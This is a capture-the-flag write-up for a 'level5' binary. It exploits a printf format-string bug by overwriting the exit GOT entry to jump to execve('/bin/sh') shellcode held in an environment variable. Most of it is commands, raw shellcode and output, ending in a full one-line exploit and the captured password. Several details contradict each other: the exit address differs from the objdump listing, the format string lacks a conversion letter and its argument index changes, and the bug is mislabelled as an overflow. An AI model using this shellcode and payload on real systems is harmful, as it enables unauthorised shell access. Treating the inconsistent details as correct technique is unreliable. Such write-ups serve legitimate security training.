### step 1 : decompile binary with ghidra

### step 2 : Check all the functions availaible :
- We find in the n function an overflow-vulnerable functions : printf(). It is vulnerable because there is no casting, printf takes a buffer. We can take advantage of that call to trick printf to read/write memory with flags in our buffer.

- An `exit(1)` call is made just after the `printf` call

This function launches a shell, therefore is our key to gain access the flag 

#### strategy 

Our strategy : overwrite the call of the `exit` function by the call of a shellcode defined in env to get access to a shell with privileges to read `/home/user/level6/.pass`  


### step3 : find exit addresses

- Address of `exit` in the Global Table Offset (GOT) : 
```
objdump -R level5
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
exit : 080497e0

The `exit` address is 080497e0 => \xe0\x97\x04\x08
 : We will overwrite this address with the address of the shellcode


### step4 : setup shellcode in env

env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")')

### step5: exploit printf overflow vulnerability


- we want to now at which position the printf starts to write the string given. For this with use this string as input : <n * char><n * %08x>
%08x will display the content of the stack chunks wrote next to the printf call

8 says that you want to show 8 digits
0 that you want to prefix with 0's instead of just blank spaces
x that you want to print in lower-case hexadecimal

```bash
./level5
aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
=> aaaa00000064.f7fcfac0.f7ec3af9.ffffd6df.ffffd6de.00000000.ffffffff.ffffd764.f7fdb000.61616161.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838
```                              

- a value is 61
- We then find that printf argument position is at 10th position

shellcode address little endian : \xae\xde\xff\xff
shellcode address : 0xffffdeae

- The function shellcode address in decimal is 4294958766 
- We have to substract the 4 bytes of the destination address written at the start of the string : 4294958766 - 4 = 4294958762

- The exploit string will be formatted like that : `<destination addr> + %<value in decimal>d + %4$n` : `\xe0\x97\x04\x08%4294958762%10$n`
- To get the exploit working we have to keep stdin open with the `cat` trick like previous exercices :

```
(python -c 'print("\xe0\x97\x04\x08%4294958762%10$n")' ; cat) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05
```
=>d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
